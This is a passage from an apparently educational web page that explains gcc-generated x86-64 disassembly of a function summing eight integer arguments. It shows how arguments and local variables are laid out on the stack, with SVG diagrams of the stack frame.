</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">112</span><span class="nl">d:</span>       <span class="err">44</span> <span class="err">89</span> <span class="err">4</span><span class="nf">d</span> <span class="no">d8</span>             <span class="no">mov</span>    <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x28</span><span class="p">],</span><span class="no">r9d</span>         <span class="c1">; 0x6
</span></span></span></code></pre></div><p>These locations are in continous order with 4-bytes of memory space for each integer. This is the optimization done by <code>gcc</code> because it knows what will be the size of the passed arguments.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="err">1131:</span>       <span class="nf">c7</span> <span class="mi">45</span> <span class="no">f8</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>    <span class="no">mov</span>    <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x8</span><span class="p">],</span><span class="mi">0x0</span>
</span></span></code></pre></div><p>Then, <code>0x0</code> is stored to <code>rbp-0x8</code>. This will be one of our local variables. Then it adds all the passed arguments and save that to another local variable.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl">    <span class="err">1138:</span>       <span class="err">8</span><span class="nf">b</span> <span class="mi">55</span> <span class="no">ec</span>                <span class="no">mov</span>    <span class="no">edx</span><span class="p">,</span><span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x14</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="err">113</span><span class="nl">b:</span>       <span class="err">8</span><span class="nf">b</span> <span class="mi">45</span> <span class="no">e8</span>                <span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span><span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x18</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="err">113</span><span class="nl">e:</span>       <span class="err">01</span> <span class="nf">c2</span>                   <span class="no">add</span>    <span class="no">edx</span><span class="p">,</span><span class="no">eax</span>
</span></span><span class="line"><span class="cl"><span class="c1">; var_edx = 0x1 + 0x2
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">    <span class="err">1140:</span>       <span class="err">8</span><span class="nf">b</span> <span class="mi">45</span> <span class="no">e4</span>                <span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span><span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x1c</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="err">1143:</span>       <span class="err">01</span> <span class="nf">c2</span>                   <span class="no">add</span>    <span class="no">edx</span><span class="p">,</span><span class="no">eax</span>
</span></span><span class="line"><span class="cl"><span class="c1">; var_edx = var_edx + 0x3
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">    <span class="err">1145:</span>       <span class="err">8</span><span class="nf">b</span> <span class="mi">45</span> <span class="no">e0</span>                <span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span><span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x20</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="err">1148:</span>       <span class="err">01</span> <span class="nf">c2</span>                   <span class="no">add</span>    <span class="no">edx</span><span class="p">,</span><span class="no">eax</span>
</span></span><span class="line"><span class="cl"><span class="c1">; var_edx = var_edx + 0x4
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">    <span class="err">114</span><span class="nl">a:</span>       <span class="err">8</span><span class="nf">b</span> <span class="mi">45</span> <span class="no">dc</span>                <span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span><span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x24</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="err">114</span><span class="nl">d:</span>       <span class="err">01</span> <span class="nf">c2</span>                   <span class="no">add</span>    <span class="no">edx</span><span class="p">,</span><span class="no">eax</span>
</span></span><span class="line"><span class="cl"><span class="c1">; var_edx = var_edx + 0x5
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">    <span class="err">114</span><span class="nl">f:</span>       <span class="err">8</span><span class="nf">b</span> <span class="mi">45</span> <span class="no">d8</span>                <span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span><span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x28</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="err">1152:</span>       <span class="err">01</span> <span class="nf">c2</span>                   <span class="no">add</span>    <span class="no">edx</span><span class="p">,</span><span class="no">eax</span>
</span></span><span class="line"><span class="cl"><span class="c1">; var_edx = var_edx + 0x6
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">    <span class="err">1154:</span>       <span class="err">8</span><span class="nf">b</span> <span class="mi">45</span> <span class="mi">10</span>                <span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span><span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp</span><span class="err">+</span><span class="mi">0x10</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="err">1157:</span>       <span class="err">01</span> <span class="nf">c2</span>                   <span class="no">add</span>    <span class="no">edx</span><span class="p">,</span><span class="no">eax</span>
</span></span><span class="line"><span class="cl"><span class="c1">; var_edx = var_edx + 0x7
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">    <span class="err">1159:</span>       <span class="err">8</span><span class="nf">b</span> <span class="mi">45</span> <span class="mi">18</span>                <span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span><span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp</span><span class="err">+</span><span class="mi">0x18</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="err">115</span><span class="nl">c:</span>       <span class="err">01</span> <span class="nf">d0</span>                   <span class="no">add</span>    <span class="no">eax</span><span class="p">,</span><span class="no">edx</span>
</span></span><span class="line"><span class="cl"><span class="c1">; var_eax = var_edx + 0x8
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">    <span class="err">115</span><span class="nl">e:</span>       <span class="err">89</span> <span class="err">45</span> <span class="nf">fc</span>                <span class="no">mov</span>    <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x4</span><span class="p">],</span><span class="no">eax</span>
</span></span><span class="line"><span class="cl"><span class="c1">; int sum = var_eax
</span></span></span></code></pre></div><p>Once all the arguments are added it stores that to another local variable. Another point to note here is that the first 6 arguments were stored to stack from general purpose registers and the rest 2 arguments (that were already on stack) were directly referenced from the stack&hellip; These values were added to stack before the previous function return value so they are referenced by <code>rbp+0x10</code> and <code>rbp+18</code>.</p>
<p>Visually this part of the stack will look something like this&hellip;</p>



<div class="goat svg-container ">
  
    <svg
      xmlns="http://www.w3.org/2000/svg"
      font-family="Menlo,Lucida Console,monospace"
      
        viewBox="0 0 496 169"
      >
      <g transform='translate(8,16)'>
<text text-anchor='middle' x='0' y='52' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='0' y='84' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='0' y='116' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='0' y='148' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='8' y='52' fill='currentColor' style='font-size:1em'>b</text>
<text text-anchor='middle' x='8' y='84' fill='currentColor' style='font-size:1em'>b</text>
<text text-anchor='middle' x='8' y='116' fill='currentColor' style='font-size:1em'>b</text>
<text text-anchor='middle' x='8' y='148' fill='currentColor' style='font-size:1em'>b</text>
<text text-anchor='middle' x='16' y='52' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='16' y='84' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='16' y='116' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='16' y='148' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='32' y='52' fill='currentColor' style='font-size:1em'>+</text>
<text text-anchor='middle' x='32' y='84' fill='currentColor' style='font-size:1em'>+</text>
<text text-anchor='middle' x='32' y='116' fill='currentColor' style='font-size:1em'>+</text>
<text text-anchor='middle' x='32' y='148' fill='currentColor' style='font-size:1em'>-</text>
<text text-anchor='middle' x='48' y='52' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='48' y='84' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='48' y='116' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='48' y='148' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='56' y='52' fill='currentColor' style='font-size:1em'>x</text>
<text text-anchor='middle' x='56' y='84' fill='currentColor' style='font-size:1em'>x</text>
<text text-anchor='middle' x='56' y='116' fill='currentColor' style='font-size:1em'>x</text>
<text text-anchor='middle' x='56' y='148' fill='currentColor' style='font-size:1em'>x</text>
<text text-anchor='middle' x='64' y='52' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='64' y='84' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='64' y='116' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='64' y='148' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='72' y='52' fill='currentColor' style='font-size:1em'>8</text>
<text text-anchor='middle' x='72' y='84' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='72' y='116' fill='currentColor' style='font-size:1em'>8</text>
<text text-anchor='middle' x='72' y='148' fill='currentColor' style='font-size:1em'>4</text>
<text text-anchor='middle' x='104' y='20' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='104' y='36' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='104' y='52' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='104' y='68' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='104' y='84' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='104' y='100' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='104' y='116' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='104' y='132' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='104' y='148' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='128' y='52' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='128' y='84' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='128' y='116' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='136' y='52' fill='currentColor' style='font-size:1em'>x</text>
<text text-anchor='middle' x='136' y='84' fill='currentColor' style='font-size:1em'>x</text>
<text text-anchor='middle' x='136' y='116' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='144' y='52' fill='currentColor' style='font-size:1em'>8</text>
<text text-anchor='middle' x='144' y='84' fill='currentColor' style='font-size:1em'>7</text>
<text text-anchor='middle' x='144' y='116' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='152' y='116' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='160' y='116' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='168' y='116' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='184' y='116' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='192' y='116' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='200' y='116' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='208' y='116' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='216' y='116' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='224' y='116' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='232' y='116' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='248' y='116' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='256' y='116' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='272' y='116' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='280' y='116' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='288' y='116' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='296' y='116' fill='currentColor' style='font-size:1em'>c</text>
<text text-anchor='middle' x='304' y='116' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='320' y='116' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='328' y='116' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='336' y='116' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='344' y='116' fill='currentColor' style='font-size:1em'>c</text>
<text text-anchor='middle' x='368' y='20' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='368' y='36' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='368' y='52' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='368' y='68' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='368' y='84' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='368' y='100' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='368' y='116' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='368' y='132' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='368' y='148' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='376' y='36' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='384' y='36' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='384' y='132' fill='currentColor' style='font-size:1em'>◄</text>
<text text-anchor='middle' x='392' y='36' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='392' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='400' y='36' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='400' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='408' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='416' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='424' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='432' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='440' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='464' y='132' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='472' y='132' fill='currentColor' style='font-size:1em'>b</text>
<text text-anchor='middle' x='480' y='132' fill='currentColor' style='font-size:1em'>p</text>
</g>

    </svg>
  
</div>
<p>Now comes the third local variable, <code>char ch='A'</code>&hellip; This is the next instruction in our disassembly</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl">  <span class="err">1161:</span>       <span class="nf">c6</span> <span class="mi">45</span> <span class="no">f7</span> <span class="mi">41</span>             <span class="no">mov</span>    <span class="no">BYTE</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x9</span><span class="p">],</span><span class="mi">0x41</span>   <span class="c1">; 0x41 = 65 = A
</span></span></span></code></pre></div><p>Now we can take a look again to the stack and understand what memory locations are for what purposes&hellip;</p>



<div class="goat svg-container ">
  
    <svg
      xmlns="http://www.w3.org/2000/svg"
      font-family="Menlo,Lucida Console,monospace"
      
        viewBox="0 0 920 681"
      >
      <g transform='translate(8,16)'>
<path d='M 592,176 L 592,192' fill='none' stroke='currentColor'></path>
<path d='M 592,192 L 592,208' fill='none' stroke='currentColor'></path>
<path d='M 600,480 L 600,496' fill='none' stroke='currentColor'></path>
<path d='M 600,496 L 600,512' fill='none' stroke='currentColor'></path>
<path d='M 600,512 L 600,528' fill='none' stroke='currentColor'></path>
<path d='M 600,528 L 600,544' fill='none' stroke='currentColor'></path>
<path d='M 600,544 L 600,560' fill='none' stroke='currentColor'></path>
<path d='M 600,560 L 600,576' fill='none' stroke='currentColor'></path>
<path d='M 600,576 L 600,592' fill='none' stroke='currentColor'></path>
<path d='M 600,592 L 600,608' fill='none' stroke='currentColor'></path>
<circle cx='320' cy='64' r='6' stroke='currentColor' fill='currentColor'></circle>
<circle cx='320' cy='96' r='6' stroke='currentColor' fill='currentColor'></circle>
<circle cx='336' cy='64' r='6' stroke='currentColor' fill='currentColor'></circle>
<circle cx='336' cy='96' r='6' stroke='currentColor' fill='currentColor'></circle>
<circle cx='352' cy='64' r='6' stroke='currentColor' fill='currentColor'></circle>
<circle cx='352' cy='96' r='6' stroke='currentColor' fill='currentColor'></circle>
<circle cx='368' cy='64' r='6' stroke='currentColor' fill='currentColor'></circle>
<circle cx='368' cy='96' r='6' stroke='currentColor' fill='currentColor'></circle>
<text text-anchor='middle' x='40' y='372' fill='currentColor' style='font-size:1em'>(</text>
<text text-anchor='middle' x='48' y='340' fill='currentColor' style='font-size:1em'>(</text>
<text text-anchor='middle' x='48' y='372' fill='currentColor' style='font-size:1em'>S</text>
<text text-anchor='middle' x='48' y='404' fill='currentColor' style='font-size:1em'>(</text>
<text text-anchor='middle' x='56' y='340' fill='currentColor' style='font-size:1em'>F</text>
<text text-anchor='middle' x='56' y='372' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='56' y='404' fill='currentColor' style='font-size:1em'>T</text>
<text text-anchor='middle' x='64' y='340' fill='currentColor' style='font-size:1em'>i</text>
<text text-anchor='middle' x='64' y='372' fill='currentColor' style='font-size:1em'>c</text>
<text text-anchor='middle' x='64' y='404' fill='currentColor' style='font-size:1em'>h</text>
<text text-anchor='middle' x='72' y='340' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='72' y='372' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='72' y='404' fill='currentColor' style='font-size:1em'>i</text>
<text text-anchor='middle' x='80' y='340' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='80' y='372' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='80' y='404' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='88' y='340' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='88' y='372' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='88' y='404' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='88' y='660' fill='currentColor' style='font-size:1em'>L</text>
<text text-anchor='middle' x='96' y='660' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='104' y='36' fill='currentColor' style='font-size:1em'>h</text>
<text text-anchor='middle' x='104' y='340' fill='currentColor' style='font-size:1em'>l</text>
<text text-anchor='middle' x='104' y='372' fill='currentColor' style='font-size:1em'>l</text>
<text text-anchor='middle' x='104' y='404' fill='currentColor' style='font-size:1em'>l</text>
<text text-anchor='middle' x='104' y='660' fill='currentColor' style='font-size:1em'>w</text>
<text text-anchor='middle' x='112' y='36' fill='currentColor' style='font-size:1em'>i</text>
<text text-anchor='middle' x='112' y='340' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='112' y='372' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='112' y='404' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='120' y='36' fill='currentColor' style='font-size:1em'>g</text>
<text text-anchor='middle' x='120' y='340' fill='currentColor' style='font-size:1em'>c</text>
<text text-anchor='middle' x='120' y='372' fill='currentColor' style='font-size:1em'>c</text>
<text text-anchor='middle' x='120' y='404' fill='currentColor' style='font-size:1em'>c</text>
<text text-anchor='middle' x='120' y='660' fill='currentColor' style='font-size:1em'>A</text>
<text text-anchor='middle' x='128' y='36' fill='currentColor' style='font-size:1em'>h</text>
<text text-anchor='middle' x='128' y='340' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='128' y='372' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='128' y='404' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='128' y='660' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='136' y='340' fill='currentColor' style='font-size:1em'>l</text>
<text text-anchor='middle' x='136' y='372' fill='currentColor' style='font-size:1em'>l</text>
<text text-anchor='middle' x='136' y='404' fill='currentColor' style='font-size:1em'>l</text>
<text text-anchor='middle' x='136' y='660' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='144' y='36' fill='currentColor' style='font-size:1em'>A</text>
<text text-anchor='middle' x='144' y='660' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='152' y='36' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='152' y='340' fill='currentColor' style='font-size:1em'>v</text>
<text text-anchor='middle' x='152' y='372' fill='currentColor' style='font-size:1em'>v</text>
<text text-anchor='middle' x='152' y='404' fill='currentColor' style='font-size:1em'>v</text>
<text text-anchor='middle' x='160' y='36' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='160' y='340' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='160' y='372' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='160' y='404' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='168' y='36' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='168' y='340' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='168' y='372' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='168' y='404' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='176' y='340' fill='currentColor' style='font-size:1em'>)</text>
<text text-anchor='middle' x='176' y='372' fill='currentColor' style='font-size:1em'>)</text>
<text text-anchor='middle' x='176' y='404' fill='currentColor' style='font-size:1em'>)</text>
<text text-anchor='middle' x='192' y='340' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='192' y='372' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='192' y='404' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='192' y='468' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='192' y='628' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='200' y='340' fill='currentColor' style='font-size:1em'>b</text>
<text text-anchor='middle' x='200' y='372' fill='currentColor' style='font-size:1em'>b</text>
<text text-anchor='middle' x='200' y='404' fill='currentColor' style='font-size:1em'>b</text>
<text text-anchor='middle' x='200' y='468' fill='currentColor' style='font-size:1em'>b</text>
<text text-anchor='middle' x='200' y='628' fill='currentColor' style='font-size:1em'>b</text>
<text text-anchor='middle' x='208' y='340' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='208' y='372' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='208' y='404' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='208' y='468' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='208' y='628' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='224' y='340' fill='currentColor' style='font-size:1em'>-</text>
<text text-anchor='middle' x='224' y='372' fill='currentColor' style='font-size:1em'>-</text>
<text text-anchor='middle' x='224' y='404' fill='currentColor' style='font-size:1em'>-</text>
<text text-anchor='middle' x='224' y='468' fill='currentColor' style='font-size:1em'>-</text>
<text text-anchor='middle' x='224' y='628' fill='currentColor' style='font-size:1em'>-</text>
<text text-anchor='middle' x='240' y='340' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='240' y='372' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='240' y='404' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='240' y='468' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='240' y='628' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='248' y='340' fill='currentColor' style='font-size:1em'>x</text>
<text text-anchor='middle' x='248' y='372' fill='currentColor' style='font-size:1em'>x</text>
<text text-anchor='middle' x='248' y='404' fill='currentColor' style='font-size:1em'>x</text>
<text text-anchor='middle' x='248' y='468' fill='currentColor' style='font-size:1em'>x</text>
<text text-anchor='middle' x='248' y='628' fill='currentColor' style='font-size:1em'>x</text>
<text text-anchor='middle' x='256' y='340' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='256' y='372' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='256' y='404' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='256' y='468' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='256' y='628' fill='currentColor' style='font-size:1em'>2</text>
<text text-anchor='middle' x='264' y='340' fill='currentColor' style='font-size:1em'>4</text>
<text text-anchor='middle' x='264' y='372' fill='currentColor' style='font-size:1em'>8</text>
<text text-anchor='middle' x='264' y='404' fill='currentColor' style='font-size:1em'>9</text>
<text text-anchor='middle' x='264' y='468' fill='currentColor' style='font-size:1em'>4</text>
<text text-anchor='middle' x='264' y='628' fill='currentColor' style='font-size:1em'>8</text>
<text text-anchor='middle' x='296' y='36' fill='currentColor' style='font-size:1em'>┌</text>
<text text-anchor='middle' x='296' y='52' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='296' y='68' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='296' y='84' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='296' y='100' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='296' y='116' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='296' y='132' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='296' y='148' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='296' y='164' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='296' y='180' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='296' y='196' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='296' y='212' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='296' y='228' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='296' y='244' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='296' y='260' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='296' y='276' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='296' y='292' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='296' y='308' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='296' y='324' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='296' y='340' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='296' y='356' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='296' y='372' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='296' y='388' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='296' y='404' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='296' y='420' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='296' y='436' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='296' y='452' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='296' y='468' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='296' y='484' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='296' y='500' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='296' y='516' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='296' y='532' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='296' y='548' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='296' y='564' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='296' y='580' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='296' y='596' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='296' y='612' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='296' y='628' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='304' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='312' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='320' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='320' y='132' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='320' y='164' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='320' y='244' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='320' y='276' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='320' y='308' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='320' y='468' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='320' y='500' fill='currentColor' style='font-size:1em'>0</text>
